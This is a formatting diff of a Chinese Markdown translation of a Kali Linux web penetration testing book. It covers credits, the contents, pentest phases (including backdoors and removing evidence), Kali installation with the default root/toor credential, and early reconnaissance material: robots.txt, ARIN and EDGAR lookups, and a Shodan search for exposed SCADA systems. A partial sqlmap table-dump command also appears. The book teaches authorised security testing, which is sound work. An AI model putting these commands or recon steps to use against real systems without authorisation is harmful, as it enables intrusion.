@@ -1,30 +1,19 @@
+
 # Kali Linux Web 渗透测试
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ## 致谢
 
 **作者**
+
 - Joseph Muniz
 - Aamir Lakhani
 
 **项目协调员**
+
 - Anugya Khurana
 
 **审核员**
+
 - Adrian Hayter
 - Danang Heriyadi
 - Tajinder Singh Kalsi
@@ -33,28 +22,36 @@
 - Nitin.K. Sookun (Ish)
 
 **校对员**
+
 - Christopher Smith
 - Clyde Jenkins
 
 **索引员**
+
 - Monica Ajmera Mehta
 
 **图形设计**
+
 - Ronak Dhruv
 
 **策划编辑**
+
 - Vinay Argekar
 
 **制作协调员**
+
 - Aditi Gajjar
 
 **首席技术编辑**
+
 - Amey Varangaonkar
 
 **封面设计**
+
 - Aditi Gajjar
 
 **技术编辑**
+
 - Pooja Arondekar
 - Sampreshita Maheshwari
 - Menza Mathew
@@ -87,10 +84,6 @@ Lakhani 使用笔名 Dr. Chaos 写作，还运营着 DrChaos.com 博客。在他
 
 **Brian Sak**（CCIE #14441）目前是思科系统（Cisco Systems）的技术解决方案师，负责解决方案开发并帮助思科合作伙伴构建和改进其咨询服务。在加入思科之前，Brian曾为大型金融机构、美国政府机构和财富500强企业提供安全咨询和评估服务。他拥有近20年的行业经验，大部分都在信息安全领域。除了许多技术安全和行业认证外，Brian 还拥有信息安全与保障硕士学位，是互联网安全中心 (CIS) 以及其他专注于安全的书籍和出版物的贡献者。
 
-
-
-
-
 Kunal Sehgal (KunSeh.com) 在完成格鲁治学院（加拿大）的网络空间课程后进入了 IT 安全行业，并从此以后一直与金融机构保持合作。这不仅让他在安全至关重要的环境中积累了经验，还为他在该领域提供了宝贵的专业知识。
 
 目前，他担任一家最大的欧洲银行之一的亚太地区（APAC）IT 安全运营负责人。总体而言，他拥有10年的丰富经验，涵盖了从漏洞评估、安全治理、风险评估到安全监控的多个领域。他拥有许多认证，包括 Backtrack 备誉的 OSCP，以及其他如 TCNA、CISM、CCSK、Security+、Cisco Router Security、ISO 27001 LA 和 ITIL。
@@ -113,45 +106,32 @@ http://PacktLib.PacktPub.com
 
 您需要对问题的即时解决方案吗？PacktLib 是 Packt 的在线数字书库。在这里，您可以访问、阅读和搜索 Packt 的整个书籍库。
 
-## 为什么要订阅？
+### 为什么要订阅？
 
 - 可全文搜索 Packt 出版的每本书书
 - 复制、粘贴、打印和书签内容
 - 按需提供并可通过网络浏览器访问
 
-## Packt 账户持有者的免费访问
+### Packt 账户持有者的免费访问
 
 如果您在 www.PacktPub.com 拥有 Packt 账户，今天可以使用它访问 PacktLib 并查看九本完全免费的书。只需使用您的登录凭据即可访问。
 
-
-
-
-
-- DirBuster 110
-
-
-
+- `DirBuster` 110
 - 中间人攻击 123
 - 总结 127
 
-
-
-
-
-
 ## 在 Kali 中的其他工具 170
-
-
-
 
 | Section | Page |
 | :--- | :--- |
+
 ## 第 6 章：Web 攻击 211
 
 | OWASP – ZAP | 225 |
 | Scapy | 238 |
 | Slowloris | 240 |
 | Low Orbit Cannon | 242 |
+
 ## 第 7 章：防御措施 251
 
 - 中间人防御 259
@@ -160,18 +140,18 @@ http://PacktLib.PacktPub.com
 - 点击劫持取证 264
 - Kali 启动盘 266
 - 使用 Kali 进行文件系统分析 267
-- dc33d 269
+- `dc33d` 269
 - Kali 中的其他工具 271
-- chkrootkit 271
-- Autopsy 271
-- Binwalk 274
-- pdf-parser 275
-- Foremost 275
-- Scalpel 276
-- bulk_extractor 276
+- `chkrootkit` 271
+- `Autopsy` 271
+- `Binwalk` 274
+- `pdf-parser` 275
+- `Foremost` 275
+- `Scalpel` 276
 
 
 
+# bulk_extractor 276
 
 | :--- | :--- |
 
@@ -217,7 +197,7 @@ Kali 是一个基于 Debian Linux 的渗透测试军库，供安全专业人员�
 
 在书中，您会发现多种风格的文本，以区分不同类型的信息。以下是这些风格的示例及其含义解释。
 
-文本中的代码词显示如下：“例如，你可以将配置命名为 My First Scan 或你喜欢的任何名称。”
+文本中的代码词显示如下：“例如，你可以将配置命名为 `My First Scan` 或你喜欢的任何名称。”
 
 代码块设置如下：
 
@@ -242,9 +222,9 @@ sqlmap -u http://www.drchaous.com/article.php?id=5 -T tablesnamehere -U test --d
 
 我们随时欢迎读者的反馈。告诉我们对这本书的看法——你喜欢或可能不喜欢的地方。读者反馈对于我们开发您真正需要的书籍至关重要。
 
-要发送一般反馈，请发送电子邮件到 feedback@packpub.com，并在邮件主题中提及书名。
+要发送一般反馈，请发送电子邮件到 `feedback@packpub.com`，并在邮件主题中提及书名。
 
-如果您在某个领域拥有专业知识，并对编写或贡献书籍感兴趣，请参阅 www.packpub.com/authors 作者指南。
+如果您在某个领域拥有专业知识，并对编写或贡献书籍感兴趣，请参阅 `www.packpub.com/authors` 作者指南。
 
 ## 客户支持
 
@@ -252,23 +232,19 @@ sqlmap -u http://www.drchaous.com/article.php?id=5 -T tablesnamehere -U test --d
 
 ## 错误说明
 
-尽管我们尽力确保内容的准确性，但错误仍然会发生。如果您在我们的书中发现错误——可能是文本或代码中的错误——我们将不胜感激您向我们报告。这样做可以避免其他读者受到困扰，并帮助我们改进书籍的后续版本。如果您发现任何错误，请访问 http://www.packpub.com/submit-errata 进行报告，选择您的书籍，点击错误提交表链接并输入错误详情。您的提交将被接受，错误将上传到我们的网站，或添加到该标题“错误”部分的任何现有错误列表中。任何现有错误可以通过 http://www.packpub.com/support 查看。
-
-
-
-
+尽管我们尽力确保内容的准确性，但错误仍然会发生。如果您在我们的书中发现错误——可能是文本或代码中的错误——我们将不胜感激您向我们报告。这样做可以避免其他读者受到困扰，并帮助我们改进书籍的后续版本。如果您发现任何错误，请访问 `http://www.packpub.com/submit-errata` 进行报告，选择您的书籍，点击错误提交表链接并输入错误详情。您的提交将被接受，错误将上传到我们的网站，或添加到该标题“错误”部分的任何现有错误列表中。任何现有错误可以通过 `http://www.packpub.com/support` 查看。
 
 # 盗版
 
 互联网上版权材料的盗版是一个跨所有媒体的持续存在的问题。在 Packt，我们非常重视对我们版权和许可的保护。如果您在互联网上发现我们作品任何形式的非法复制，请立即向我们提供位置地址或网站名称，以便我们采取补救措施。
 
-请通过 copyright@packtpub.com 与我们联系，并附上可疑盗版材料的链接。
+请通过 `copyright@packtpub.com` 与我们联系，并附上可疑盗版材料的链接。
 
 感谢您帮助保护我们的作者，并使我们能够继续提供有价值的内容。
 
 # 常见问题
 
-如果您对本书的任何方面有疑问，可以通过 questions@packtpub.com 与我们联系，我们将尽力为您解决。
+如果您对本书的任何方面有疑问，可以通过 `questions@packtpub.com` 与我们联系，我们将尽力为您解决。
 
 ## 1 渗透测试与环境搭建
 
@@ -287,6 +263,8 @@ sqlmap -u http://www.drchaous.com/article.php?id=5 -T tablesnamehere -U test --d
 使用 Kali Linux 进行 Web 渗透测试——BackTrack 的下一代——是一本实操指南，将提供发现漏洞和利用 Web 应用程序的逐步方法。本书将涵盖目标研究、识别和利用 Web 应用程序以及使用应用程序服务的客户端漏洞、防御常见攻击的 Web 应用程序，以及为专业服务实践构建渗透测试交付物。我们认为这本书适用于任何对学习如何成为渗透测试人员感兴趣的人、Kali Linux 新手并想了解 Kali 与 BackTrack 特性及差异的用户，以及可能需要对新工具技术进行复习或参考的资深渗透测试人员。
 
 本章将分解各种安全服务背后的基本概念，以及建立专业渗透测试实践的指南。概念包括区分渗透与其他与其他、方法论概述以及针对 Web 应用程序。本章还简要介绍了搭建 Kali 测试环境或真实环境。
+
+
 
 # Web 应用程序渗透测试概念
 
@@ -311,10 +289,6 @@ Web 应用程序渗透测试的范围可能有所不同，因为 Web 应用程�
 白盒是指渗透测试人员对系统有深入了解。渗透测试的目标明确，测试报告的结果通常是预期的。测试提供了目标的细节，如网络信息、系统类型、公司流程和服务。白盒测试通常关注特定的业务目标（例如满足合规性需求），而不是通用评估，根据目标空间的限制，其周期可能更短。白盒任务可以减少信息收集工作（如侦察服务），从而降低渗透测试服务的成本。
 
 > 内部安全小组通常执行白盒测试。
-
-
-
-
 
 # 第一章
 
@@ -353,17 +327,15 @@ Web 应用程序渗透测试的范围可能有所不同，因为 Web 应用程�
 
 了解如何计算与发现的漏洞相关的风险是重要的，以便做出反应决策。大多数客户在确定风险影响时会参考 CISSP 的 CIA 三角。CIA 是特定系统或应用程序的机密性、完整性和可用性。在确定风险影响时，客户必须单独查看每个组件并整体考虑漏洞，以获得风险的真实视角并确定影响的可能性。
 
-
-
-
-
 ### 认证信息安全专业人员 (CISP) 课程列出了以下风险计算公式。
 
 单次损失期望（SLE）是资产价值（AV）发生单次损失的成本。暴露因子（EF）是资产损失对组织的影响，例如由于面向互联网的服务器关闭导致收入损失。客户在评估安全投资时，应该计算资产的 SLE，以帮助识别应分配给控制措施的资金水平。如果单次 SLE 会给公司造成 100 万美元的损失，那么在预算中考虑这一点是合理的。
 
 单次损失期望公式：
 
+```
 SLE = AV * EF
+```
 
 下一个重要的公式是识别 SLE 发生的频率。如果一次价值 100 万美元的 SLE 每年发生一次（例如从天空落下的陨石），那么可能不值得在你的总部周围投资一个保护罩。相比之下，如果火灾每隔几年就可能导致一次价值 100 万美元的损失，那么投资防火系统将是明智的。资产丢失的次数被称为年度发生率（ARO）。
 
@@ -371,17 +343,21 @@ SLE = AV * EF
 
 年化损失期望公式：
 
+```
 ALE = SLE * ARO
+```
 
 最后一个需要回答的问题是与资产相关的风险，用于确定控制措施的投入。这可以决定客户应该以及投入多少资金来修复资产中发现的漏洞。
 
 风险公式：
 
-Risk = 资产价值 * 威胁 * 漏洞 * 影响
+
+
+`Risk = 资产价值 * 威胁 * 漏洞 * 影响`
 
 客户通常没有风险管理公式中变量的数值。这些公式充当了引导系统，帮助客户更好地理解他们应该如何投入安全资金。在我之前的示例中，对陨星雨和建筑火灾的估计美元值使用这些公式，有助于解释为什么防火系统比防止物体坠落的金属罩是更好的投资。
 
-## 渗透测试与设置
+# 渗透测试与设置
 
 渗透测试是以类似于恶意攻击者的方式攻击系统漏洞的方法。通常，当系统或网络的安全投入耗尽，且客户寻求验证是否所有安全领域都已覆盖时，就会请求渗透测试服务。根据约定的工作范围，渗透测试可以是黑盒、白盒或灰盒。
 
@@ -395,19 +371,17 @@ Risk = 资产价值 * 威胁 * 漏洞 * 影响
 
 对于服务提供者而言，渗透测试项目的成功取决于交付渗透测试项目所需的时间和服务的盈利能力。更高效、更准确的过程意味着使用更少的服务获得更好的结果。交付物的质量越高，服务就越能满足客户的预期，从而获得更好的声誉和更安全的未来。出于这些原因，开发一套执行渗透测试服务的方法论以及如何报告发现内容的方法至关重要。
 
-### Kali 渗透测试概念
+## Kali 渗透测试概念
 
 Kali Linux 的设计旨在遵循渗透测试服务执行的流程。无论起点是白盒、黑盒还是灰盒测试，在使用 Kali或其他工具对目标进行渗透测试时，都应该遵循一套步骤。
 
-### 第一步 – 侦察
+## 第一步 – 侦察
 
 在发起攻击之前，你应该尽可能多了解目标环境和系统特征。你对目标识别的信息越多，你发现通往成功最早的最快路径的机会就越大。黑盒测试比白盒测试需要更多的侦察，因为没有提供有关目标的数据。侦察服务包括研究目标的互联网足迹，监控资源、人员和流程，扫描 IP 地址和系统等网络信息。
 
 无论是验证已知信息还是寻求目标的新情报，侦察都是渗透测试服务执行执行的第一步。侦察从根据工作范围定义目标环境开始。一旦确定了目标，就会对目标进行研究以收集情报，例如使用的端口、托管位置、提供的服务类型等。这些数据将就有关最简单的方法制定行动计划。侦察任务的交付物应包括所有目标资产列表、关联的应用程序、使用的服务以及可能的所有者。
 
 Kali Linux 提供了一个名为“信息收集”的类别，作为侦察资源。工具包括研究网络、数据中心、无线和主机系统的方法。
-
-## 渗透测试与设置
 
 以下是侦察目标列表：
 
@@ -419,7 +393,7 @@ Kali Linux 提供了一个名为“信息收集”的类别，作为侦察资源
 - 被动社会工程学信息
 - 记录发现
 
-### 第二步 – 目标评估
+## 第二步 – 目标评估
 
 一旦通过侦察工作识别并研究了目标，下一步是评估目标的漏洞。此时，渗透测试人员应该足够了解目标，以选择如何分析可能的漏洞或弱点。例如测试 Web 应用程序运行方式、识别的服务、通信端口或其他方面的弱点。漏洞评估和安全审计通常在目标评估过程的此阶段结束。
 
@@ -434,10 +408,6 @@ Kali Linux 提供了一个名为“信息收集”的类别，作为侦察资源
 - 将漏洞系统映射到资产所有者
 - 记录发现
 
-
-
-
-
 ## 第 3 步 – 利用 (Exploitation)
 
 此步骤通过利用发现的漏洞来验证漏洞是否真实，以及可以获取哪些可能的信息或权限。利用是将渗透测试与漏洞评估和审计等被动服务区分开来。如果没有目标资产所有者的授权，利用及后续所有步骤都具有法律风险。
@@ -447,6 +417,7 @@ Kali Linux 提供了一个名为“信息收集”的类别，作为侦察资源
 根据最终目标，利用目标可以是手动或自动的。例如，运行 SQL 注入以获取 Web 应用程序的访问权限，或通过社会工程学引导桌面人员提供管理员登录凭据。Kali Linux 提供了一个名为“利用工具”（Exploitation Tools）的专用工具目录，涵盖了从利用特定服务到社会工程包的工具。
 
 以下是利用目标的列表：
+
 - 利用漏洞
 - 获取立足 (Foothold)
 - 提取未经授权的数据
@@ -463,6 +434,7 @@ Kali Linux 提供了一个名为“信息收集”的类别，作为侦察资源
 Kali Linux 包含了许多工具，可以通过攻击和工具帮助实现权限提升。
 
 以下是权限提升目标的列表：
+
 - 获取对系统和网络的提升级访问权限
 - 发现其他用户账户
 - 使用提升后的权限访问其他系统
@@ -477,6 +449,7 @@ Kali Linux 包含了许多工具，可以通过攻击和工具帮助实现权限
 Kali Linux 包含一个名为“维持访问”（Maintaining Access）的目录，专注于在目标内部维持立足。这些工具用于向目标建立各种形式后门。
 
 以下是维持立足的目标列表：
+
 - 建立访问目标的方法
 - 删除授权访问的证据
 - 修复影响利用的系统
@@ -496,6 +469,8 @@ Backpack 的创建者发布了一个全新的高级渗透测试发行版，名�
 
 可以通过几种不同的方式下载 Kali Linux。获取 Kali Linux 最流行的方法之一是下载 ISO 镜像。ISO 镜像提供 32 位和 64 位版本。
 
+
+
 如果你计划在虚拟机（如 VMware）上使用 Kali Linux，有一个 VM 镜像。下载 VM 镜像的优势是它预装了 VMware 工具。VM 镜像是一个支持物理地址扩展（Physical Address Extension，称为 PAE）的 32 位镜像。理论上讲，PAE 内核允许你访问比传统 32 位操作系统更多的内存。操作系统领域有一些知名人物对 PAE 内核的用性持有争议。然而，本书作者建议如果你计划使用虚拟环境，请使用 Kali Linux 的 VM 镜像。
 
 ## 从外部介质运行 Kali Linux
@@ -506,107 +481,102 @@ Backpack 的创建者发布了一个全新的高级渗透测试发行版，名�
 
 ### 安装 Kali Linux
 
-在计算机上安装 Kali Linux 非常简单，与其他安装操作系统类似。你需要兼容的计算机硬件。Kali 支持 i386、amd64 和 ARM（包括 armhf 和 arm64）平台。硬件要求如下列表所示，尽管我们建议至少超过最低要求三倍。通常情况下，如果 Kali Linux 拥有更多内存并安装在较新的机器上，其性能会更好。下载 Kali Linux并将 ISO 刻录到 DVD，或准备一个带有 Kali Linux Live 的 USB 盘作为安装媒介。如果你的电脑没有 DVD 驱动器或 USB 端口，请查看 Kali Linux 网络安装。
+在计算机上安装 Kali Linux 非常简单，与其他安装操作系统类似。你需要兼容的计算机硬件。Kali 支持 `i386`、`amd64` 和 `ARM`（包括 `armhf` 和 `arm64`）平台。硬件要求如下列表所示，尽管我们建议至少超过最低要求三倍。通常情况下，如果 Kali Linux 拥有更多内存并安装在较新的机器上，其性能会更好。下载 Kali Linux 并将 ISO 刻录到 DVD，或准备一个带有 Kali Linux Live 的 USB 盘作为安装媒介。如果你的电脑没有 DVD 驱动器或 USB 端口，请查看 Kali Linux 网络安装。
 
 以下是最小安装要求的列表：
+
 - 安装 Kali Linux 至少需要 8 GB 磁盘空间。
-- 对于 i386 和 amd64 架构，至少 512MB RAM。
+- 对于 `i386` 和 `amd64` 架构，至少 512MB RAM。
 - CD-DVD 驱动器 / USB 支持。
 - 安装前需要连接互联网。这非常重要，否则在安装期间无法配置和访问仓库。
 
 1. 启动 Kali 时，你将看到引导安装界面。你可以选择想要执行的安装类型（基于图形或基于文本）。
-
 2. 选择本地语言偏好、国家和键盘偏好。
-
 3. 为 Kali Linux 主机选择主机名。默认主机名是 Kali。
-
-
-
-
-
-## 渗透测试与设置
-
 4. 选择密码。简单的密码可能无效，因此请选择一个具有一定复杂度的密码。
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_0.png)
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_0.png)
 
-设置用户和密码
+    设置用户和密码
 
-你需要为 'root'（系统管理员账户）设置一个密码。拥有 root 权限的恶意用户或不合格的用户可能会导致灾难性的结果，因此你应该注意选择一个不容易被猜中的的 root 密码。它不应该是字典中找到的单词，也不应该是容易与你相关联的单词。一个良好的密码应该包含字母、数字和标点符号的混合，并应该定期更改。root 用户不应有空密码，如果你将其留空，root 账户将被禁用，并且系统的初始用户账户将获得使用 'sudo' 命令成为 root 的权限。
+    你需要为 `root`（系统管理员账户）设置一个密码。拥有 `root` 权限的恶意用户或不合格的用户可能会导致灾难性的结果，因此你应该注意选择一个不容易被猜中的的 `root` 密码。它不应该是字典中找到的单词，也不应该是容易与你相关联的单词。一个良好的密码应该包含字母、数字和标点符号的混合，并应该定期更改。`root` 用户不应有空密码，如果你将其留空，`root` 账户将被禁用，并且系统的初始用户账户将获得使用 `sudo` 命令成为 `root` 的权限。
 
-注意，在输入密码时将无法显示内容。
-root 密码：
-请再次输入相同的 root 密码以验证你的输入是否正确。
-重新输入密码以验证：
+    注意，在输入密码时将无法显示内容。
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_1.png)
+    `root` 密码：
+
+    请再次输入相同的 `root` 密码以验证你的输入是否正确。
+
+    重新输入密码以验证：
+
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_1.png)
 
 5. 下一个提示询问你的时区。根据需要进行修改并选择继续。下一个截图显示了选择东部标准。
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_2.png)
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_2.png)
 
-配置时钟
-如果列表中没有列所需的时区，请返回“选择语言”步骤并选择一个使用所需时区的国家（你居住或所在的国家）。
-选择你的时区：
-- 东部 (Eastern)
-- 中部 (Central)
-- 山地山区 (Mountain)
-- 太平洋 (Pacific)
-- 阿拉斯斯加 (Alaska)
-- 夏威夷 (Hawaii)
-- 亚利桑那 (Arizona)
-- 东印第安纳州 (East Indiana)
-- 萨摩亚 (Samoa)
+    配置时钟
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_3.png)
+    如果列表中没有列所需的时区，请返回“选择语言”步骤并选择一个使用所需时区的国家（你居住或所在的国家）。
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_42_0.png)
+    选择你的时区：
 
-分区磁盘
-安装程序可以引导你对磁盘进行分区（使用不同的标准方案）；或者，如果你愿意，也可以手动进行。通过引导式分区，你稍后仍有机会查看并自定义结果。
-如果你选择对整块磁盘进行引导式分区，接下来你将被要求指定使用哪块磁盘。
-分区方法：
+    - 东部 (Eastern)
+    - 中部 (Central)
+    - 山地山区 (Mountain)
+    - 太平洋 (Pacific)
+    - 阿拉斯斯加 (Alaska)
+    - 夏威夷 (Hawaii)
+    - 亚利桑那 (Arizona)
+    - 东印第安纳州 (East Indiana)
+    - 萨摩亚 (Samoa)
 
-| 引导式 - 使用整个磁盘 |
-| 引导式 - 使用整个磁盘并设置 LVM |
-| 引导式 - 使用整个磁盘并设置加密 LVM |
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_41_3.png)
 
-截图：返回 继续
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_42_0.png)
 
-## 渗透测试与设置
+    分区磁盘
+
+    安装程序可以引导你对磁盘进行分区（使用不同的标准方案）；或者，如果你愿意，也可以手动进行。通过引导式分区，你稍后仍有机会查看并自定义结果。
+
+    如果你选择对整块磁盘进行引导式分区，接下来你将被要求指定使用哪块磁盘。
+
+    分区方法：
+
+    - 引导式 - 使用整个磁盘
+    - 引导式 - 使用整个磁盘并设置 LVM
+    - 引导式 - 使用整个磁盘并设置加密 LVM
+
+    截图：返回 继续
 
 6. 最后一个窗口显示了安装设置的审查。如果一切看起来都正确，请选择“是”以继续过程，如下截图所示：
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_43_0.png)
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_43_0.png)
 
 7. Kali Linux 使用中央存储库来发布软件包。如果你想安装这些软件包，你需要使用网络镜像。软件包通过 HTTP 协议下载。如果你的网络使用代理服务器，你还需要为你的网络配置代理设置。
 
-# KALI LINUX
+    配置包管理器
 
-配置包管理器
+    网络镜像可用于补充光光盘中包含的软件。这也可以使新版本的软件可用。
 
-网络镜像可用于补充光光盘中包含的软件。这也可以使新版本的软件可用。
+    使用网络镜像？
 
-使用网络镜像？
+    - 否
+    - 是
 
-- 否
-- 是
-
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_44_0.png)
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_44_0.png)
 
 8. Kali 将提示安装 GRUB。GRUB 是一个多引导加载程序，赋予用户选择并启动多个操作系统的能力。在大多数情况下，你应该选择安装 GRUB。如果你正在配置系统进行双系统，你将希望确保 GRUB 识别其他操作系统，以便为用户提供启动备用操作系统的选项。如果它没有检测到其他操作系统，机器将自动启动到 Kali Linux。
 
-## 渗透测试与设置
-
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_45_0.png)
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_45_0.png)
 
 9. 恭喜！你已经完成了 Kali Linux 的安装。你需要移除所有媒体（物理或虚拟）并选择“继续”以重启你的系统。
 
-![](img/df1fdcde66c92c1fef83bd651dd5ffe3_45_1.png)
+    ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_45_1.png)
 
 ## Kali Linux 和虚拟机镜像首次运行
 
-在某些 Kali Linux 安装中，将被要求设置 root 密码。当 Kali Linux 启动时，输入 root 用户名和你选择的密码。如果你下载了 Kali 的虚拟机镜像，你需要 root 密码。默认用户名是 root，密码是 toor。
+在某些 Kali Linux 安装中，将被要求设置 `root` 密码。当 Kali Linux 启动时，输入 `root` 用户名和你选择的密码。如果你下载了 Kali 的虚拟机镜像，你需要 `root` 密码。默认用户名是 `root`，密码是 `toor`。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_46_0.png)
 
@@ -635,10 +605,11 @@ Kali Linux 提供了许多为渗透测试设计的自定义工具。工具如下
 | | > | 报告工具 (Reporting Tools) |
 | | > | 系统服务 (System Services) |
 
-## 渗透测试与设置
-
 - **信息收集 (Information Gathering)**：这些是用于收集目标系统数据的工具。
 - **漏洞分析 (Vulnerability Analysis)**：这些工具通常用于评估系统漏洞。
+
+
+
 - **Web 应用 (Web Applications)**：这些是用于 Web 服务器漏洞的工具。
 - **密码攻击 (Password Attacks)**：该部分主要涉及身份验证的离线计算。
 - **无线攻击 (Wireless Attacks)**：这些是用于利用无线协议漏洞的工具。
@@ -655,10 +626,6 @@ Kali Linux 提供了许多为渗透测试设计的自定义工具。工具如下
 本章作为 Web 渗透测试的介绍以及 Kali Linux 设置的概述。我们首先定义了执行渗透测试服务的最佳实践，包括定义风险和各种服务之间的差异。结论是理解渗透测试与其他安全服务的区别，如何妥善界定服务范围以及执行服务的最佳方法。预先与潜在客户建立正确的预期将有助于筛选机会，并简化开发可接受的工作范围。
 
 本章继续提供了 Kali Linux 的概览，包括如何下载你所需的 Kali Linux 版本、执行安装的方法以及可用工具集的简要概述。下一章将介绍如何对目标进行信息收集。这是交付渗透测试服务的第一步也是最关键的一步。
-
-
-
-
 
 ## 2 侦察
 
@@ -696,9 +663,9 @@ Kali Linux 包含了大量的专门用于侦察工作的**信息收集**工具�
 
 通过查看其他哪些公司被列为合作伙伴、当前的职位、业务信息和安全政策，可以获得更有价值的信息。对高价值合作伙伴的侦察可能与主要目标一样重要，因为合作伙伴可能提供获取情报的新来源。例如，攻破管理目标总部帮助台的受约资源。
 
-Robots.txt 文件是公开的，网站上的它向 Web 机器人（也称为搜索引擎爬虫）提供指令，根据机器人排除协议（Robots Exclusion Protocol）哪些是可以哪些是不可能的。Disallow: / 语句告诉浏览器不要访问源；然而，研究人员可以根据目标希望向公众披露的信息来忽略 Disallow 指令。
+`Robots.txt` 文件是公开的，网站上的它向 Web 机器人（也称为搜索引擎爬虫）提供指令，根据机器人排除协议（Robots Exclusion Protocol）哪些是可以哪些是不可能的。`Disallow: /` 语句告诉浏览器不要访问源；然而，研究人员可以根据目标希望向公众披露的信息来忽略 `Disallow` 指令。
 
-要查看，在目标网站的根目录下找到 Robots.txt 文件。例如，在 Facebook 上添加 Robots.txt 文件如下所示：
+要查看，在目标网站的根目录下找到 `Robots.txt` 文件。例如，在 Facebook 上添加 `Robots.txt` 文件如下所示：
 
 ```
 https://www.facebook.com/robots.txt
@@ -731,9 +698,11 @@ Disallow: /search.php
 
 通过查看其他哪些公司被列为合作伙伴、当前的职位、业务信息和安全政策，可以获得更有价值的信息。对高价值合作伙伴的侦察可能与主要目标一样重要，因为合作伙伴可能提供获取情报的新来源。例如，攻破管理目标总部帮助台的受约资源。
 
-Robots.txt 文件是公开的，网站上的它向 Web 机器人（也称为搜索引擎爬虫）提供指令，根据机器人排除协议（Robots Exclusion Protocol）哪些是可以哪些是不可能的。Disallow: / 语句告诉浏览器不要访问源；然而，研究人员可以根据目标希望向公众披露的信息来忽略 Disallow 指令。
+`Robots.txt` 文件是公开的，网站上的它向 Web 机器人（也称为搜索引擎爬虫）提供指令，根据机器人排除协议（Robots Exclusion Protocol）哪些是可以哪些是不可能的。`Disallow: /` 语句告诉浏览器不要访问源；然而，研究人员可以根据目标希望向公众披露的信息来忽略 `Disallow` 指令。
 
-要查看，在目标网站的根目录下找到 Robots.txt 文件。例如，在 Facebook 上添加 Robots.txt 文件如下所示：
+要查看，在目标网站的根目录下找到 `Robots.txt` 文件。例如，在 Facebook 上添加 `Robots.txt` 文件如下所示：
+
+
 
 ```
 https://www.facebook.com/robots.txt
@@ -768,7 +737,7 @@ Disallow: /search.php
 
 RIR 是在世界特定区域管理分配和注册 IP 资源的组织。有五个主要的 RIR：美国、加拿大和加勒比地区的部分可以在 www.arin.net 找到。你可以获取如 Lancope 等目标的信息，如下：
 
-| 组织 | |
+| 组织 |  |
 |---|---|
 | 名称 | Lancope |
 | 句 | LANCOP |
@@ -779,15 +748,11 @@ RIR 是在世界特定区域管理分配和注册 IP 资源的组织。有五个
 | 国家 | US |
 | 注册日期 | 2002-06-21 |
 | 最后更新 | 2011-09-24 |
-| 注释 | |
+| 注释 |  |
 | RESTful 链接 | http://whois.arin.net/rest/org/LANCOP |
 | 相关 | 相关网络。 |
 | 相关的 | 相关的自治系统编号。 |
 | 相关的 | 相关的 POC 记录。 |
-
-
-
-
 
 ## 电子数据收集、分析与检索 (EDGAR)
 
@@ -800,8 +765,8 @@ EDGAR 数据库包含了自 1994 年以来公司的注册声明、定期报告�
 | 2008-04-25 | 2008-04-26 |
 | 接受 | 生效日期 |
 | 2008-04-30 12:50:12 | 2008-04-25 |
-| 文档 | |
-| 1 | |
+| 文档 |  |
+| 1 |  |
 
 ## 文档格式文件
 
@@ -810,29 +775,38 @@ EDGAR 数据库包含了自 1994 年以来公司的注册声明、定期报告�
 | 1 | 自动生成的纸质文档 扫描纸质文档 提交文本文件 |
 
 LANCOPE INC (申报者) Cik: 0001178004 (查看所有公司申报文件)
+
 IRS.: 0000000000
+
 类型: EDGAR | 法案: 34 | 编号: 021-45780 | 机构号: 08045849
 
 | 表格 D | OMB | OMB |
 | :--- | :--- | :--- |
-| | 美国 | OMB 编号: 3215-0976 |
+|  | 美国 | OMB 编号: 3215-0976 |
 | 证券交易委员会 | 有期至：2008年4月30日 | 每份表格的平均负担工时 |
-| 华盛顿特区 20549 | | 16.00 |
-| 08045849 | | 仅供 SEC 使用 |
+| 华盛顿特区 20549 |  | 16.00 |
+| 08045849 |  | 仅供 SEC 使用 |
 
 发行人名称：[如果这是修订案且更改了名称或地址，请勾选此处。]
+
 普通股发行 [返回]
+
 根据规则申报（勾选框）：[规则 504][规则 505][规则 506] [第4(6) 节] [JOE 章节]
+
 申报类型：[新增] [修订]
 
 ### A. 基础识别
 
 ### 1. 输入下方请求的信息
+
 发行人名称（名称和街道、城市、州、邮编）
 
 Lancope, Inc.
+
 执行官地址: 电话号码（包括区号）
+
 3650 Brookside P Pkwy, Brookside Concourse 100, Suite 400, 770-225-6580
+
 Alphabetra, GA 30022
 
 ### 社交媒体资源
@@ -865,23 +839,27 @@ Shodan 是一种搜索引擎，可以识别特定的设备，如计算机、路�
 
 以下示例搜索任何理论上不应接入互联网的 SCADA 系统，但 Shodan 可以显示这并非事实。SCADA 系统控制着电力管理和水处理等[](img/df1fdcde66c92c1fef83bd651dd5ffe3_60_png)
 
-| 服务 | | |
+| 服务 |  |  |
 | :--- | :--- | :--- |
 | HTTP | 135 | HTTP/1.0 |
 | Net | 44 | Date: Thu, 28 Feb 2013 17:57:16 GMT |
 | SMB | 25 | Server: Boa/93.15 |
 | FTP | 12 | Connection: close |
-| HTTP Alternate | | WWW-Authenticate: Basic realm="webSCADA*"Content-Type: text/html |
-
-| 国家 | | |
+| HTTP Alternate |  | WWW-Authenticate: Basic realm="webSCADA*"Content-Type: text/html |
+| 国家 |  |  |
 | :--- | :--- | :--- |
 | 美国 | 69 | 401 Unauthorized |
 | 加拿大 | 41 | 65.98.173.75 |
 | 芬兰 | 18 | Conway Group, LLC |
 | 瑞典 | 13 | Added on 28.02.2013 |
 | 丹麦 | 12 | Palm Desert 70-78-114-148.business.telia.com |
+| 城市 |  |  |
 
